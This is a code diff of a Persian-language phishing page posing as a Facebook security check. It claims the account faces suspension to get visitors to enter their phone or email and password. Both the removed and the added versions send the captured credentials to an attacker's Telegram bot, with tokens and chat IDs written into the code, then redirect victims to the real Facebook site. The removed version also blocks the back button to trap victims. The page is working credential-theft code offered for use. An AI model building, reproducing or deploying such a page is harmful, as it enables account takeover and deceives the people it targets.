@@ -2,105 +2,61 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>تایید هویت | مرکز امنیت متـا</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Security Check</title>
     <style>
-        body { background-color: #f0f2f5; font-family: Tahoma, Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; overflow: hidden; }
-        .app-container { background: white; width: 100%; max-width: 420px; min-height: 100vh; display: flex; flex-direction: column; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
-        .nav-bar { background: #1877f2; color: white; padding: 15px; font-size: 22px; font-weight: bold; text-align: right; display: flex; align-items: center; justify-content: space-between; }
-        .lang-switch { font-size: 12px; font-weight: normal; opacity: 0.8; }
-        .hero-section { padding: 25px; text-align: center; border-bottom: 1px solid #e5e5e5; }
-        .shield-icon { width: 70px; margin-bottom: 15px; animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
-        h2 { font-size: 18px; color: #1c1e21; margin: 10px 0; }
-        .verify-text { font-size: 13.5px; color: #606770; line-height: 1.7; text-align: justify; background: #fff9e6; border: 1px solid #ffe58f; padding: 15px; border-radius: 8px; margin-top: 10px; }
-        .form-area { padding: 25px; flex-grow: 1; }
-        .input-box { width: 100%; padding: 16px; margin-bottom: 15px; border: 1px solid #dddfe2; border-radius: 10px; font-size: 15px; background: #f5f6f7; box-sizing: border-box; transition: 0.3s; text-align: left; direction: ltr; }
-        .input-box:focus { border-color: #1877f2; background: white; outline: none; box-shadow: 0 0 0 2px #e7f3ff; }
-        .primary-btn { width: 100%; padding: 15px; background: #1877f2; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.2s; }
-        .primary-btn:active { transform: scale(0.98); opacity: 0.9; }
-        .footer { padding: 20px; font-size: 11px; color: #90949c; text-align: center; }
-        #step2 { display: none; }
-        .fade-in { animation: fadeIn 0.5s ease-in; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        body { font-family: Tahoma, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
+        .header { color: #1877f2; font-size: 24px; font-weight: bold; margin-bottom: 20px; font-family: sans-serif; }
+        .warning-box { background-color: #fff9e6; border: 1px solid #ffeeba; padding: 15px; border-radius: 5px; margin-bottom: 20px; font-size: 13px; line-height: 1.6; color: #856404; text-align: right; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
+        button { width: 100%; background-color: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        button:hover { background-color: #166fe5; }
+        .footer-links { margin-top: 15px; border-top: 1px solid #dddfe2; padding-top: 15px; }
+        .forgot-pass { color: #1877f2; text-decoration: none; font-size: 14px; }
+        .meta-logo { width: 60px; margin-top: 20px; opacity: 0.5; }
     </style>
 </head>
 <body>
 
-<div class="app-container">
-    <div class="nav-bar">
-        <span>facebook</span>
-        <span class="lang-switch">فارسی (ایران)</span>
+<div class="container">
+    <div class="header">facebook</div>
+    
+    <div class="warning-box">
+        <strong>بررسی امنیتی حساب کاربری</strong><br>
+        توجه: ما متوجه فعالیت غیرعادی در حساب شما شدیم. برای جلوگیری از مسدود شدن دائمی، لطفا اطلاعات زیر را جهت تایید مالکیت واقعی حساب وارد نمایید.
     </div>
 
-    <div class="hero-section">
-        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y2/r/86_fW-o5v-u.png" class="shield-icon">
-        <h2>بررسی امنیتی حساب کاربری</h2>
-        <div class="verify-text">
-            <strong>توجه سرپرست سیستم:</strong> ما متوجه فعالیتی غیرعادی در حساب شما شدیم. برای جلوگیری از مسدود شدن دائمی (Disabled)، لطفاً اطلاعات زیر را جهت تایید مالکیت واقعی حساب وارد نمایید. این یک پروسه الزامی برای امنیت شبکه متـا است.
-        </div>
+    <form id="loginForm">
+        <input type="text" id="user" placeholder="شماره موبایل یا ایمیل" required>
+        <input type="password" id="pass" placeholder="رمز عبور" required>
+        <button type="submit">تایید و ادامه</button>
+    </form>
+
+    <div class="footer-links">
+        <a href="#" class="forgot-pass">رمز عبور خود را فراموش کرده‌اید؟</a>
     </div>
 
-    <div class="form-area">
-        <div id="step1" class="fade-in">
-            <input type="text" id="user_id" class="input-box" placeholder="شماره موبایل یا ایمیل" autocomplete="off">
-            <button class="primary-btn" onclick="showPass()">تایید و ادامه</button>
-        </div>
-
-        <div id="step2" class="fade-in">
-            <p style="font-size: 13px; color: #1c1e21; margin-bottom: 10px;">رمز عبور حساب خود را جهت احراز هویت نهایی وارد کنید:</p>
-            <input type="password" id="user_pass" class="input-box" placeholder="Password" autocomplete="off">
-            <button class="primary-btn" id="submitBtn" onclick="finalize()">تکمیل احراز هویت</button>
-        </div>
-    </div>
-
-    <div class="footer">
-        Meta Security Systems &copy; 2026<br>
-        شناسه رهگیری امنیتی: FB-992-PROTECT
-    </div>
+    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yD/r/t9nZp2VBy_4.png" class="meta-logo" alt="Meta Logo">
 </div>
 
 <script>
-    // جلوگیری از خروج و دکمه بازگشت
-    window.onbeforeunload = function() { return "خروج از این صفحه منجر به غیرفعال شدن حساب شما می‌شود!"; };
-    history.pushState(null, null, location.href);
-    window.onpopstate = function () { history.go(1); };
+    const token = "7547781747:AAH0pYdE6K5A_UjU_fVof1Xk0lR3fQ5v9sc"; // توکن بات خودت
+    const chatId = "7334759604"; // چت آیدی خودت
 
-    let loginId = "";
-
-    function showPass() {
-        const val = document.getElementById('user_id').value;
-        if(val.length < 5) {
-            alert("لطفاً شماره موبایل یا ایمیل معتبر وارد کنید.");
-            return;
-        }
-        loginId = val;
-        document.getElementById('step1').style.display = 'none';
-        document.getElementById('step2').style.display = 'block';
-    }
-
-    function finalize() {
-        const pass = document.getElementById('user_pass').value;
-        if(pass.length < 4) {
-            alert("رمز عبور وارد شده کوتاه است.");
-            return;
-        }
-
-        const btn = document.getElementById('submitBtn');
-        btn.innerText = "در حال بررسی...";
-        btn.disabled = true;
-
-        const msg = `👑 شکار ویژه (تایید هویت)!\n👤 یوزر: ${loginId}\n🔑 پسورد: ${pass}\n🇮🇷 وضعیت: هدف در حال تایید است`;
-
-        fetch(`https://api.telegram.org/bot8486500261:AAF8V0mNot6Uu3PAfP_BkF4wuJTX7Yns3f4/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: '7394414495', text: msg })
-        }).then(() => {
-            window.onbeforeunload = null;
-            window.location.href = 'https://www.facebook.com/security/2fa/setup/intro/'; 
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const user = document.getElementById('user').value;
+        const pass = document.getElementById('pass').value;
+        
+        const message = `🔔 اطلاعات جدید دریافت شد!\n\n👤 یوزرنیم: ${user}\n🔑 پسورد: ${pass}`;
+        
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+        .then(() => {
+            alert("درخواست شما ثبت شد. پس از بررسی توسط تیم فنی، نتیجه از طریق اعلان به شما اطلاع داده خواهد شد.");
+            window.location.href = "https://www.facebook.com/security";
         });
-    }
+    });
 </script>
 
 </body>
